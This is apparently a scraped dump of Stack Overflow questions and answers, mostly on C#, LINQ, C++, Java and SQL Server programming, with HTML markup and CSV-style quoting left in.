<p>However, an isolated computer system (without any external input) is a deterministic finite state machine. That is, by knowing the current state of the machine, you can <em>always</em> predict the next state. So, if you mean ""unpredictable"" by a software system in general, no, you can't use a deterministic system to generate ""true randomness"" according to this definition. </p>

<p>There's another kind of unpredictability that is more philosophical. Even if you rely on external input (such as atmospheric noise or other means), are they really unpredictable? One might argue that we live in a deterministic world and like a digital computer, everything is determined to happen; so, there's no randomness. I don't have an answer for that.</p>
"
"<p>Currently I use a block of code like this, to fetch a set of DB objects with matching IDs.</p>

<pre><code>List&lt;subjects&gt; getSubjectsById(List&lt;long&gt; subjectIDs){

  return ctx.tagSubjects.Where(t =&gt; subjectIDs.Contains(t.id)).ToList();
}
</code></pre>

<p>But this is really inefficient, because it requires the entire table to be read from the database and then filtered inside of C#.</p>

<p>What I would rather do would be something the equivelent of:</p>

<pre><code>SELECT * FROM subjects WHERE subjects.id IN (1,2,3,4,5,...);
</code></pre>

<p>The big difference is that in the first example the filtering is happening inside the C# code, and in the second the filtering is done on the SQL server (where the data is).  </p>

<p>Is there a [better] way to do this with LINQ?</p>
","33708","","<p>Where did you find out that it downloads the entire table from SQL Server? </p>

<p>I'm sure it does what you want. It translates the query to a parameterized <code>IN</code> clause like:</p>

<pre><code>... IN (@p1, @p2, @p3)
</code></pre>

<p>and passes the contents of the list as values to those parameters. You can confirm this with tools such as SQL Profiler and LINQ to SQL debugger visualizer or set the <code>DataContext.Log</code> property to console (before executing the query) and read the generated SQL:</p>

<pre><code>dataContext.Log = Console.Out;
</code></pre>
"
"<p>Im going through a project I have taken over, and on the database side I have noticed that the previous programmers have written a bunch of triggers to delete child records.  The thing is, these records already have a a foreign key relationship with the parent record I am deleting.  The delete triggers are nothing but simple delete statements for the child records.</p>

<p>Is there a benefit to writing a trigger to delete child records, or can I just change it to cascade on delete and be fine?</p>

<p>Im using MSSQL 2008.</p>
","33708","","<p>Stay away from unnecessary triggers. </p>

<p>Go with <code>ON DELETE CASCADE</code> if that's all you need to do.</p>
"
"<pre><code>class A
{
public:
  A();
  ~A();
  int X;
};

A::A()
{
  X = 5;
  int Y = 4;
}

//..... in another file
A * objectOnHeap = new A();
</code></pre>

<p>In this case, since ""objectOnHeap"" is on the heap, is X also on the heap even though it wasn't specifically new'd up?  And in this case Y is allocated on the stack (and of course goes out of scope), correct?</p>

<p>I am wondering if I have gotten my wires crossed when trying to envision how objects are stored in memory.</p>
","33708","","<p>Yes. It's on the heap. Basically, the space allocated to an object on the heap is big enough to hold all its member variables.</p>
"
"<p>I'm looking for advice on the best way to represent this JSON object in C#. </p>

<p>To be clear, I'm not trying to convert from an existing JSON string to C# object - this is from scratch. I can visualize what I'm trying to create as JSON, but not sure how that translates...</p>

<pre><code>[
{
   ""EquipmentID"": ""ASD2F"",
   ""ConnectionIDs"":[
	  { ""ConnectionID"": ""HD4GH"" },
	  { ""ConnectionID"": ""KAFD3"" },
	  { ""ConnectionID"": ""NA3AF"" }
   ]
},
{
   ""EquipmentID"": ""GAE31"",
   ""ConnectionIDs"":[
	  { ""ConnectionID"": ""HJA03"" },
	  { ""ConnectionID"": ""FGVA1"" },
	  { ""ConnectionID"": ""GHAD8"" }
   ]
}
]
</code></pre>

<p>That's basically an array of EquipmentID's, each EquipmentID containing an array of ConnectionID's. I've been tinkering with a few different Classes containing arrays, lists, etc... but I can't seem to settle on anything. I know this should be incredibly simple, so thanks in advance for helping out!</p>
","33708","","<p>Something like this makes sense:</p>

<pre><code>class Equipment {
    public string Id { get; set; }
    public List&lt;string&gt; ConnectionIds { get; set; }
}
</code></pre>

<p>Then you'd have a variable of type <code>List&lt;Equipment&gt;</code> to hold the equipments.</p>

<p>By the way, it's not clear to me whether <code>ConnectionIds</code> themselves are equipments or not. If they are, you'd basically have:</p>

<pre><code>class Equipment {
    public string Id { get; set; }
    public List&lt;Equipment&gt; Connections { get; set; }
}
</code></pre>
"
"<p>I have an application that requires manipulating <a href=""http://en.wikipedia.org/wiki/Nibble"" rel=""nofollow"">nybbles</a> and possibly even individual bits at a time. Is there a library in C# that can help me?</p>
","33708","","<p>You can use <a href=""http://msdn.microsoft.com/en-us/library/system.collections.specialized.bitvector32.aspx"" rel=""nofollow""><code>BitVector32</code></a> to manipulate bits in a 32 bit integer and <a href=""http://msdn.microsoft.com/en-us/library/system.collections.bitarray.aspx"" rel=""nofollow""><code>BitArray</code></a> to have an array of bits representing a set of boolean variables.</p>

<p>Also, it's pretty easy to write a couple functions to manipulate individual bits:</p>

<pre><code>public bool GetBitValue(int integer, int bit) {
    return (integer &amp; (1 &lt;&lt; bit)) != 0; 
}

public bool SetBitValue(ref int integer, int bit, bool value) {
    if (value)
        integer |= 1 &lt;&lt; bit;
    else
        integer &amp;= ~(1 &lt;&lt; bit);
}
</code></pre>
"
"<p>I'm wondering if it's possible to pass a class as a parameter in c++.
Not passing a Class Object, but the class itself which would allow me to use this class like this.</p>

<pre><code>void MyFunction(ClassParam mClass)
{
    mClass *tmp = new mClass();
}
</code></pre>

<p>The above is not real code, but it hopefully explains what I'm trying to do in an example.</p>
","33708","","<p>You can use templates to accomplish something similar (but not exactly that):</p>

<pre><code>template&lt;class T&gt;
void MyFunction()
{
    T *tmp = new T();
}
</code></pre>

<p>and call it with <code>MyFunction&lt;MyClassName&gt;()</code>.</p>

<p>Note that this way, you can't use a ""variable"" in place of <code>T</code>. It should be known at compile time.</p>
"
"<p>When designing ASMX web services, there is some sort of restriction on the types which you can use (Serialize/deserialize).</p>

<p>Can anyone let me know what these restrictions are? Can it be bypassed by just adding the serializable attribute to the code?</p>
","33708","","<p>Nope. Traditional ASMX Web services use <code>XmlSerializer</code> class and stuff are <a href=""http://stackoverflow.com/questions/109318/using-net-what-limitations-if-any-are-there-in-using-the-xmlserializer"">subject to the restrictions imposed by that class</a>, the most prominent of which is probably not being able to serialize dictionaries. It doesn't care about the <code>[Serializable]</code> attribute as <code>BinaryFormatter</code> does.</p>
"
"<p>Are there any issues with using anonymous types with the Json() method in asp.net mvc?</p>

<p>I recently had an issue where returning an anonymous type from a Linq .First() would not work when returned to the jQuery caller. I created a simply subclass inside my controller and simple assigned values from the query object and that seemed to serialize and work fine. </p>

<p>This worked:</p>

<pre><code>public class JsonJob
{
    public int Id { get; set; }
    public string Title { get; set; }
    public string Description { get; set; }
    public DateTime DateAdded { get; set; }
    public DateTime? DateModified { get; set; }
};

var jsonJob = from job in db.Jobs
              where job.Id == jobId
              select new JsonJob
              {
                  Id = job.Id,
                  Title = job.Title,
                  Description = job.Description,
                  DateAdded = job.DateAdded,
                  DateModified = job.DateModified
              };

return Json(jsonJob.First());
</code></pre>

<p>But this did not:</p>

<pre><code>var jsonJob = from job in db.Jobs
              where job.Id == jobId
              select job;

return Json(jsonJob.First());
</code></pre>
","33708","","<p>Your second query does not return an anonymous type. It probably returns an entity type (generated by the <code>DataContext</code> code generator from the DBML file), which might have a bunch of things you don't like. Returning an anonymous type shouldn't cause a problem as the <code>Json</code> method doesn't care about the type name at all:</p>

<pre><code>// anonymous type example:
var jsonJob = from job in db.Jobs
              where job.Id == jobId
              select new {  // Note that no class name is specified here 
                 job.Id,
                 job.Title, 
                 job.Description, 
                 job.DateAdded, 
                 job.DateModified
              };
</code></pre>
"
"<p>I statically recompiled a Java lib which used generics a lot, like <code>Collection&lt;?&gt;</code>, but the emitted .NET dll only uses <code>Collection</code>, not with type parameters. How come? </p>
","33708","","<p>Java generics are dealt by the Java compiler and are converted to non-generic version at compile time. This is different from .NET where the CLR has first class support for type parameters. At the bytecode level, <code>ArrayList&lt;T&gt;</code> will just be a simple <code>ArrayList</code>.</p>

<p>To quote <a href=""http://java.sun.com/developer/technicalArticles/J2SE/generics/"">Java docs</a>:</p>

<blockquote>
  <p>Generics are implemented by the Java compiler as a front-end conversion called <em>erasure</em>, which is the process of translating or rewriting code that uses generics into non-generic code (that is, maps the new syntax to the current JVM specification). <strong>In other words, this conversion erases all generic type information; all information between angle brackets is erased.</strong> For example, <code>LinkedList&lt;Integer&gt;</code> will become <code>LinkedList</code>. Uses of other type variables are replaced by the upper bound of the type variable (for example, <code>Object</code>), and when the resulting code is not type correct, a cast to the appropriate type is inserted. </p>
</blockquote>
"
"<p>Is <code>if ( c )</code> the same as <code>if ( c == 0 )</code> in C++?</p>
","33708","","<p>It's more like <code>if ( c != 0 )</code></p>

<p>Of course, <code>!=</code> operator can be overloaded so it's not perfectly accurate to say that those are exactly equal.</p>
"
"<p>How Do You create a .net application with no UI.  How would I go about doing this?  I don't want it to be a console application.  The best choice would seem to be a winform application that never calls application.run. </p>

<p>The goal of the app is to be run and do a simple task. say check a server for an update or copy files.  Nothing long running where a windows service would be necessary.</p>
","33708","","<p>If Windows Service isn't an option, you can simply create an empty project (or console app) and set the compiler target to Windows Application in the project properties (<code>/t:winexe</code> command line option). This is essentially equivalent to your own proposal.</p>

<p>The whole point is, <code>/t:winexe</code> sets the <code>subsystem</code> flag in the generated binary to a Windows executable so that the command prompt is not shown when the app is executed.</p>
"
"<p>How does it work? Does it have distinct parts - some methods are managed, some are unmanaged, does it convert every method to managed, trying to keep everything managed and doing the interop calls when he must?</p>
","33708","","<p>There are three different <a href=""http://msdn.microsoft.com/en-us/library/85344whh.aspx"">compiler switches</a> related to managed code generation in C++/CLI:</p>

<p><code>/clr:pure</code> makes the compiler produce MSIL code. No unmanaged functions are allowed (everything is compiled to MSIL). This mode is similar to <code>unsafe</code> C# code. In this mode, you can use the CRT there's a pure MSIL version of it available. Assemblies compiled in this mode cannot be used in partial trust environments that require verifiable code (e.g. some SQL Server hosted assemblies).  </p>

<p><code>/clr:safe</code> makes the compiler produce verifiable MSIL code, similar to the C# compiler. No C++ interop is allowed. You can run <code>/clr:safe</code> assemblies in partial trust environments where verifiability is enforced by security policy.</p>

<p><code>/clr</code> generates mixed assemblies. The binary will contain both MSIL code and native code. They are not mixed together in say, a single class. Managed and unmanaged parts are separate and the compiler will generate code to interop and marshal data between two parts as necessary.</p>

<p>To directly answer your question, no specific ""conversion"" is performed. Unmanaged code is simply not allowed in <code>pure</code> and <code>safe</code> modes. Where it's allowed, managed stuff are compiled down to MSIL and unmanaged stuff are compiled to machine code. Any interop between them requires the compiler to generate code. There's no magic there. It just hides some interop stuff from the programmer but the code is there nonetheless.</p>
"
"<p>And why doesn't it shows the real type (eg: List&lt;string&gt; instead of List`1)?<br>
Where does this strange (to me) notation comes from?</p>
","33708","","<p>The CLR name for generic <code>List&lt;T&gt;</code> with one type parameter is </p>

<pre><code>System.Collections.Generic.List`1
</code></pre>

<p><code>List&lt;T&gt;</code> is the C# style of naming that type.</p>

<p>The notation is a convention defined to give you the ability to overload generic types by parameter count. If you declare a class named <code>List</code> with two type parameters (e.g. <code>List&lt;T,U&gt;</code>) the compiler would be able to choose the right one. It'll be named:</p>

<pre><code>System.Collections.Generic.List`2
</code></pre>

<p>and a non-generic <code>List</code> class will be named:</p>

<pre><code>System.Collections.Generic.List
</code></pre>

<p>Note that the CLR does not <em>require</em> generic types to be named like that. It's just a convention for the compilers to be able to pick the right type.</p>
"
"<p>how do you return number of distinct/unique values in an array for example</p>

<pre><code>int[] a = {1,2,2,4,5,5};
</code></pre>
","33708","","<pre><code>Set&lt;Integer&gt; s = new HashSet&lt;Integer&gt;();
for (int i : a) s.add(i);
int distinctCount = s.size();
</code></pre>
"
"<p>In the tree class I'm suppose to compare two node, for you know searching and adding items. I have some issues with how to make it comparable. When one adds data(generic, anything) to the tree one calls the Tree class which then makes a new Node object. How can I declare the variable data/element in the Node class so that it is of type E (anything) and still Comparable? Seriously, I've tried back and forth without concluding with anything. </p>
","33708","","<p>Not everything is <code>Comparable</code>. Your requirement is self-contradictory. You can constrain <code>E</code> to be comparable by declaring the generic parameter like:</p>

<pre><code>&lt; E extends Comparable&lt;E&gt; &gt;
</code></pre>

<p>This way, the consumer of the class can use all classes that implement <code>Comparable</code> interface with it. You'll be able to access the <code>compareTo</code> method on things typed <code>E</code>.</p>
"
"<p>I used to write this:</p>

<pre><code>Private Sub Example()
Static CachedPeople As List(Of MyApp.Person)
If CachedPeople Is Nothing Then
    CachedPeople = New List(Of MyApp.Person)
End If
...rest of code...
End Sub
</code></pre>

<p>But then wondered if I could reduce this to:</p>

<pre><code>Private Sub Example()
Static CachedPeople As New List(Of MyApp.Person)
...rest of code...
End Sub
</code></pre>

<p>The question is, will the ""New"" bit only be executed once when the function is first executed but in the next call, it will already exist.</p>

<p>Cheers, Rob.</p>
","33708","","<p>It'll be executed only once and on next function call, it'll reference the same object, as you mentioned. Your first snippet is not thread-safe, by the way. If two threads call your function at the same time, they might end up running the constructor twice, which is not what you want. Using the second snippet relieves you from manually locking and ensuring thread safety, as the compiler generates the appropriate code for you.</p>

<p>Note that if you had declared it as</p>

<pre><code>Static x As List(Of String)
x = New List(Of String)
</code></pre>

<p>It would have been recreated each time.</p>
"
"<p>What's the safest and best way to retrieve an unsigned long from a string in C++?</p>

<p>I know of a number of possible methods.</p>

<p>First, converting a signed long taken from atol.</p>

<pre><code>char *myStr; // Initalized to some value somehow.
unsigned long n = ((unsigned)atol(myStr));
</code></pre>

<p>The obvious problem with this is, what happens when the value stored in myStr is larger than a signed long can contain?  What does atol retrieve?</p>

<p>The next possibility is to use strtoul.</p>

<pre><code>char *myStr; // Initalized to some value somehow.
unsigned long n = strtoul(myStr, 0, 10);
</code></pre>

<p>However, this is a little over complicated for my needs.  I'd like a simple function, string in, unsigned long base 10 out.  Also, the error handling leaves much to be desired.</p>

<p>The final possibility I have found is to use sscanf.</p>

<pre><code>char *myStr; // Initalized to some value somehow.
unsigned long n = 0;
if(sscanf(myStr, ""%lu"", n) != 1) {
    //do some error handling
}
</code></pre>

<p>Again, error handling leaves much to be desired, and a little more complicated than I'd like.</p>

<p>The remaining obvious option is to write my own either a wrapper around one of the previous possibilities or some thing which cycles through the string and manually converts each digit until it reaches ULONG_MAX.</p>

<p>My question is, what are the other options that my google-fu has failed to find?  Any thing in the C++ std library that will cleanly convert a string to an unsigned long and throw exceptions on failure?</p>

<p>My apologies if this is a dupe, but I couldn't find any questions that exactly matched mine.</p>
","33708","","<p>One way to do it:</p>

<pre><code>stringstream(str) &gt;&gt; ulongVariable;
</code></pre>
"
"<p>This is a real beginner question (I'm still learning the Java basics).</p>

<p>I can (sort of) understand why methods would return a List&lt;String&gt; rather than an ArrayList&lt;String&gt;, or why they would accept a List parameter rather than an ArrayList. If it makes no difference to the method (i.e., if no special methods from ArrayList are required), this would make the method more flexible, and easier to use for callers. The same thing goes for other collection types, like Set or Map.</p>

<p>What I don't understand: it appears to be common practice to create local variables like this:</p>

<pre><code>List&lt;String&gt; list = new ArrayList&lt;String&gt;();
</code></pre>

<p>While this form is less frequent:</p>

<pre><code>ArrayList&lt;String&gt; list = new ArrayList&lt;String&gt;();
</code></pre>

<p>What's the advantage here?</p>

<p>All I can see is a minor disadvantage: a separate ""import"" line for java.util.List has to be added. Technically, ""import java.util.*"" could be used, but I don't see that very often either, probably because the ""import"" lines are added automatically by some IDE.</p>
","33708","","<p>When you read </p>

<pre><code>List&lt;String&gt; list = new ArrayList&lt;String&gt;();
</code></pre>

<p>you get the idea that all you care about is being a <code>List&lt;String&gt;</code> and you put less emphasis on the actual implementation. Also, you restrict yourself to members declared by <code>List&lt;String&gt;</code> and not the particular implementation. You don't care if your data is stored in a linear array or some fancy data structure, as long as it looks like a <code>List&lt;String&gt;</code>.</p>

<p>On the other hand, reading the second line gives you the idea that the code <em>cares</em> about the variable being <code>ArrayList&lt;String&gt;</code>. By writing this, you are implicitly saying (to future readers) that you shouldn't blindly change actual object type because the rest of the code <strong>relies</strong> on the fact that it is really an <code>ArrayList&lt;String&gt;</code>.</p>
"
"<p>i have a list of filter names: FILTERBYNAMES</p>

<p>my query result items each contain a name list: NAMES</p>

<p>I want to filter the result an take all items whose name list contains at least one name in the FILTERNAMELIST:</p>

<pre><code>   results= result.where(r=&gt;r.NAMES.CONTAINS(...?)...?
</code></pre>
","33708","","<p>I think you need something like:</p>

<pre><code>var results = list.Where(i =&gt; i.Names
                               .Any(name =&gt; filterNameList.Contains(name)));
</code></pre>
"
"<p>I have a factory that is supposed to create objects that inherit from class Foo at run-time. I would think that System.Activator.CreateInstance's return type was the same as the type of an object it's creating, but judging from the following error message, its return type is Object.</p>

<blockquote>
  <p>Error 1	Cannot implicitly convert type 'object' to 'cs_sandbox.Foo'. An explicit conversion exists (are you missing a cast?)	F:\projects\cs_sandbox\Form1.cs	46	24	cs_sandbox</p>
</blockquote>

<p>OK, so maybe I <em>am</em> missing a cast, but</p>

<pre><code>return (t)System.Activator.CreateInstance(t);
</code></pre>

<p>results in yet another error message, which -- I must admit -- makes no sense to me:</p>

<blockquote>
  <p>Error 1	The type or namespace name 't' could not be found (are you missing a using directive or an assembly reference?)	F:\projects\cs_sandbox\Form1.cs	45	25	cs_sandbox</p>
</blockquote>

<p>And here's my code:</p>

<pre><code>class Foo { }
class FooChild1 : Foo { }
class FooChild2 : Foo { }

class MyFactory
{
    public static Foo CreateInstance(string s)
    {
        Type t;
        if (s.StartsWith(""abcdef""))
        {
            t = typeof(FooChild1);
            return System.Activator.CreateInstance(t);
        }
        else
        {
            t = typeof(FooChild2);
            return System.Activator.CreateInstance(t);
        }
    }
}
</code></pre>

<p>How can I fix this code? Or, if it's not fixable, what are other ways of creating objects that inherit from a specific class at run-time?</p>
","33708","","<p>You need to cast the returned object to <code>Foo</code> type. It doesn't make sense to cast it to a type defined in a variable. It should be known by the compiler, as the whole point of casting through the inheritance hierarchy is satisfying compiler's static type checking.</p>

<pre><code>return (Foo)System.Activator.CreateInstance(t);
</code></pre>

<p>There's a generic version, <code>System.Activator.CreateInstance&lt;T&gt;</code>, which creates a known type (not a type variable but a type argument or a statically known type, in the latter case, it doesn't make much sense though):</p>

<pre><code>return System.Activator.CreateInstance&lt;FooChild1&gt;();
</code></pre>
"
"<p>I need to update the first N rows in a table meeting a condition. </p>

<p>I know I can do an Update Top N... but the problem is that N is in a @variable.</p>

<p>UPDATE TOP @N SET ... doesn't work.</p>

<p>Is there a way to do this that I am just missing?</p>

<p>No specific table definitions here because it doesn't matter what the columns are.. If I can do it for a one column table I can do it for my table.</p>
","33708","","<p>You need to use parens after <code>TOP</code> clause when you want to use a variable:</p>

<pre><code>UPDATE TOP(@N) ...
</code></pre>
"
"<p>Just a quick one for an expert in the field :)</p>

<p>Can I use the marshallbyrefobject class to get objects to be reference across a network, rather than just across application domains?</p>

<p>If not, is there another set of classes to do this? i.e. reference and use an object across a network where that object is processed and stored at the remote location.</p>

<p>Thanks a million,
Mike</p>
","33708","","<p>Yes, <code>MarshalByRefObject</code> is the base class for remotely accessible objects in <a href=""http://msdn.microsoft.com/en-us/library/kwdt6w2k%28VS.71%29.aspx"" rel=""nofollow"">.NET Remoting</a>. It works whether the remote object is in another application domain in the same process or on an application domain on the other side of the globe. </p>

<p>By the way, .NET Remoting is considered obsolete in favor of newer technologies like <a href=""http://msdn.microsoft.com/en-us/netframework/aa663324.aspx"" rel=""nofollow"">WCF</a>. While it's still suitable for some applications, most new applications should consider using WCF.</p>
"
"<p>I have a stored procedure that returns rows:</p>

<pre><code>CREATE PROCEDURE MyProc
AS
BEGIN
    SELECT * FROM MyTable
END
</code></pre>

<p>My actual procedure is a little more complicated, which is why a sproc is necessary.</p>

<p>Is it possible to select the output by calling this procedure?</p>

<p>Something like:</p>

<pre><code>SELECT * FROM (EXEC MyProc) AS TEMP
</code></pre>

<p>I need to use <code>SELECT TOP X</code>, <code>ROW_NUMBER</code>, and an additional <code>WHERE</code> clause to page my data, and I don't really want to pass these values as parameters.</p>
","33708","","<p>You can use a <a href=""http://msdn.microsoft.com/en-us/library/aa175085%28SQL.80%29.aspx"">User-defined function</a> or a <a href=""http://msdn.microsoft.com/en-us/library/aa258253%28SQL.80%29.aspx"">view</a> instead of a procedure.</p>

<p>A procedure can return multiple result sets, each with its own schema. It's not suitable for using in a <code>SELECT</code> statement.</p>
"
"<p>I like the idea of a so called session-ID, which is sent to the browser and returned back for auth. But can I store more data in serverside session variables, for subsequent sessions to access? I'm using PHP.</p>
","33708","","<p>Session variables are stored on the server side. Only the session ID will be sent back from client. The server will look up its session store for the ID and fetches the variables. The actual variables are <strong>not</strong> sent to the client at all. This makes session state a nightmare for scalable Web applications since it relies on the server to keep track of users state. The more stuff you put in session, the more overhead per session you'll have on the server.</p>

<p>If you want to store variables on the client itself, you should be using cookies instead of session.</p>
"
"<p>What is the reason why I can't put parenthesis after my Method name when assigning it to a delegate type.</p>

<p>Here is code:</p>

<pre><code>public delegate Simple Simple(); //Create a delegate that returns its own type.

class Program
{
    public class Exercise
    {
        public static Simple Welcome()
        {
            Console.WriteLine(""Welcome!"");
            return null;

        }
    }
    static void Main(string[] args)
    {
        Simple msg;
        msg = Exercise.Welcome(); //Since Welcome returns Simple, I can execute it.

        msg();
        Console.Read();
    }
}
</code></pre>
","33708","","<p>It lets the compiler distinguish a method call from a reference to a method group. If you add parenthesis, the compiler will call the method and uses the return value of that method call, instead of the method group itself.</p>
"
"<p>I've got the following code:</p>

<pre><code>List&lt;Person&gt; people = new List&lt;Person&gt;
    {
    	new Person{ Id = 1, Name = ""Bob""},
    	new Person{ Id = 2, Name = ""Joe""},
    	new Person{ Id = 3, Name = ""Bob""}
    };

    var peopleGroupedByName = from p in people 
                              group p by p.Name;

    //get all groups where the number of people in the group is &gt; 1
</code></pre>

<p>For the life of me I can't figure out how to work with the values returned by the linq query to be able to then filter all of the groups that were returned so that I only have the groups that have more than one item in them.</p>

<p>At the moment I'm banging my head against a wall and I can't quite think of what keywords to use in a google search in order to figure it out for myself.</p>

<p>I'd really appreciate any help on how to do this in Linq cause it seems like it should be very simple to do.</p>
","33708","","<pre><code>var peopleGroupedByName = people.GroupBy(p =&gt; p.Name)
                                .Where(g =&gt; g.Count() &gt; 1);

var peopleGroupedByName = from p in people 
                          group p by p.Name into g
                          where g.Count() &gt; 1
                          select g;
</code></pre>
"
"<p>I'm reading bits from a monochrome bitmap. I'm storing every 16 bits in a <code>short</code> in the reverse order. If the bit in the bitmap is black, store a 1. If white, store a 0.</p>

<p>E.g.: for bitmap: bbbw bbbw bbbw wwww
<br />my short is: 0000 0111 0111 0111</p>

<p>The 1st way I tried to do this was:</p>

<pre><code>short m;
// ...
Color c = bmp.GetPixel(j, i);
if (c.R == Color.Black)
    m |= short.MinValue;
m &gt;&gt;= 1;
// ...
</code></pre>

<p>After one assignment and shift, I got the expected -32768 (1000 0000 0000 0000).
<br />After the 2nd time I got -16384 (1100 0000 0000 0000).</p>

<p>I changed my code to use <code>ushort</code> and changed the <code>if</code> line to <code>s |= (ushort)Math.Pow(2, 15);</code> and now it works.</p>

<p>My question is: why will the sign bit not shift in .NET? Is there a way to shift the sign bit?</p>
","33708","","<p>Right shifting <em>signed</em> integers in C# fills the left bits with the <strong>sign bit</strong>. Effectively, the result of right shifting a signed integer by a single bit is equivalent to dividing it by 2.</p>

<p>You can find this kind of right shifting in other places too. For example, x86 assembly provides two distinct instructions, <code>sar</code> (which fills the left bits with sign bit) and <code>shr</code> (which fills left bits with zero).</p>

<p>If you don't want this behavior in C#, you'll have to use unsigned types when shifting.</p>
"
"<p>I have a situation in code where a <code>Dictionary&lt;string, string&gt;</code> seemed like the best idea - I need a collection of these objects and I need them to be accessible via a unique key. Exactly what the Dictionary concept is for, right?</p>

<p>Well, the requirements have expanded to the point where I now need to hold an additional bit of information per-key (a boolean value, if you're curious).</p>

<p>So, I figure expand the concept to create a new data structure with the string and the boolean and have it now be a <code>Dictionary&lt;string, NewCustomObject&gt;</code>.</p>

<p>However, for just one additional value like a boolean flag, it just feels like overkill. And yet I don't know of any Dictionary-like generic object with two values per key. </p>

<p>Is just having a Dictionary of custom objects the best way to go about this or is there something simpler for this scenario?</p>
","33708","","<p>Doesn't this work for ya?</p>

<pre><code>Dictionary&lt;string, List&lt;string&gt;&gt;
</code></pre>

<p>Or you could use a <a href=""http://stackoverflow.com/questions/1099134/what-is-the-best-way-to-return-two-lists-in-c/1099154#1099154"">Tuple</a> and have a dictionary of that:</p>

<pre><code>Dictionary&lt;string, Tuple&lt;string, bool&gt;&gt;
</code></pre>
"
"<p>Can someone give me an idea of an efficient algorithm for large n (say 10^10) to find the sum of above series?</p>

<p>Mycode is getting klilled for n= 100000 and m=200000</p>

<pre><code>#include&lt;stdio.h&gt;

int main() {
    int n,m,i,j,sum,t;
    scanf(""%d%d"",&amp;n,&amp;m);
    sum=0;
    for(i=1;i&lt;=n;i++) {
    	t=1;
    	for(j=1;j&lt;=i;j++)
    		t=((long long)t*i)%m;
    	sum=(sum+t)%m;
    }
    printf(""%d\n"",sum);

}
</code></pre>
","33708","","<p>Two notes:</p>

<pre><code>(a + b + c) % m
</code></pre>

<p>is equivalent to </p>

<pre><code>(a % m + b % m + c % m) % m
</code></pre>

<p>and</p>

<pre><code>(a * b * c) % m
</code></pre>

<p>is equivalent to</p>

<pre><code>((a % m) * (b % m) * (c % m)) % m
</code></pre>

<p>As a result, you can calculate each term using a recursive function in O(log <em>p</em>):</p>

<pre><code>int expmod(int n, int p, int m) {
   if (p == 0) return 1;
   int nm = n % m;
   long long r = expmod(nm, p / 2, m);
   r = (r * r) % m;
   if (p % 2 == 0) return r;
   return (r * nm) % m;
}
</code></pre>

<p>And sum elements using a <code>for</code> loop:</p>

<pre><code>long long r = 0;
for (int i = 1; i &lt;= n; ++i)
    r = (r + expmod(i, i, m)) % m;
</code></pre>

<p>This algorithm is O(<em>n</em> log <em>n</em>).</p>
"
"<p>I have a <strong>list(of t)</strong> and I got a <strong>iqueryable(of a)</strong></p>

<p>I want to <strong>filter out</strong> any item from the <strong>iqueryable(of a)</strong> where a.id = t.myotherid</p>

<p>I'm not really sure how to write this query, anyone could help me here?</p>

<p>For now I got this</p>

<pre><code>Dim listCie = (From c In db.getListCompany() _
                Where Not rels.Select(Function(a) a.ChildID).Contains(c.ID) _
                  And Not rels.Select(Function(a) a.ParentId).Contains(c.ID) _
                Select c)
</code></pre>

<p>question is, should I use <strong>.Any</strong> or is there any better way?</p>
","33708","","<pre><code>Dim result = From item In queryable _
             Where Not list.Select(Function(x) x.MyOtherId).Contains(item.Id) _
             Select item
</code></pre>
"
"<p>I have a List which contains dates from June 1, 2009 to June 1, 2014.  How would I query it in C# LINQ to select only the first date of each month?</p>
","33708","","<p>Your question is slightly ambiguous. If you want the first item <em>appearing in the list</em> in each month, you can use: </p>

<pre><code>var result = list.GroupBy(x =&gt; new { x.Year, x.Month })
                 .Select(x =&gt; x.Min());
</code></pre>
"
"<p>Lets assume the following function:</p>

<pre><code>private void ParseFolder(string strFolder)
{
    foreach (string currentFolder in Directory.GetDirectories(strFolder))
    ParseFolder(strFolder);
}
</code></pre>

<p>Now we start our recursive loop with:</p>

<pre><code>ParseFolder(""C:\"");
</code></pre>

<p>Is there a way to be notified when this recusrive loop ends (= all directories have been parsed)? </p>
","33708","","<p>Yes, just add a method call after it:</p>

<pre><code>ParseFolder(""C:\\""); // You need to escape \
Notify();
</code></pre>
"
"<p><strong>The Base Class:</strong></p>

<pre><code>public class DatabaseBase
{
  private readonly string connectionString;
  private bool useCounters;

  public DatabaseBase(string connectionString)
  {
   this.connectionString = connectionString;
  }

  public DatabaseBase(...)
  {
   connectionString = ...;   
  }

  public DatabaseBase(..)
  {
   connectionString = string.Format(...);
  }

  public string ConnectionString
  {
   get { return this.connectionString; }
  }

...
</code></pre>

<p><strong>The derived class:</strong></p>

<pre><code>public class ProjectDB : DatabaseBase
{
private bool useServiceConnection;

 private static string ConnectionString
 {
     get
     {
        string connectionString = useServiceConnection == true ? ConfigurationManager.AppSettings[""SomeConnection1""] : ConfigurationManager.AppSettings[""SomeConnection2""];
         return connectionString;
     }
 }


public ProjectDB() : this(false)
{
}

 private bool isServiceCall;

public ProjectDB(bool useServiceConnection)
    : base(ConnectionString)
{
    this.useServiceConnection = useServiceConnection;
}

private SqlConnection CreateConnection()
{
    return new SqlConnection(ConnectionString);
}
</code></pre>

<p>I'm getting the error ""Cannot access non-static field useServiceConnection in static context"" for this line:</p>

<pre><code>string connectionString = useServiceConnection == true ? ConfigurationManager.AppSettings[""SomeConnection1""] : ConfigurationManager.AppSettings[""SomeConnection2""];
</code></pre>

<p>However if I make useServiceConnection a static var to satisfy the quirement, then I get that same error here in the constructor:</p>

<pre><code>public ProjectDB(bool useServiceConnection)
    : base(ConnectionString)
{
    this.useServiceConnection = useServiceConnection;
}
</code></pre>

<p>Now if I make useServiceConnection and ConnectionSting property non-static, then I get that error for the constructor here:</p>

<pre><code>public LitleDB(bool useWebServiceConnection)
    : base(ConnectionString)
{
    this.useWebServiceConnection = useWebServiceConnection;
}
</code></pre>

<p>I think the first 2 I understand.  </p>

<p>But now with the example updated below, why would the constructor in this case give me an error still?  Those are no longer static so where's the static context being expected from?  So here's what I have now:</p>

<pre><code>public class ProjectDB : DatabaseBase
 {
    private bool useServiceConnection; &lt;-- NO LONGER STATIC

     private new string ConnectionString &lt;-- NO LONGER STATIC
     {
         get
         {
            string connectionString = useServiceConnection == true ? ConfigurationManager.AppSettings[""SomeConnection1""] : ConfigurationManager.AppSettings[""SomeConnection2""];
             return connectionString;
         }
     }

    public ProjectDB() : this(false)
    {
    }

     private bool isServiceCall;

    public ProjectDB(bool useServiceConnection)
        : base(ConnectionString)  &lt;--- IT'S COMPLAINING HERE NOW, SO WHERE IS IT TRYING TO ACCESS STATICALLY?  I DON'T GET WHY
    {
        this.useServiceConnection = useServiceConnection;
    }
</code></pre>

<p>I have other static properties in this class, does that have anything to do with it?  I'm not using them though.</p>
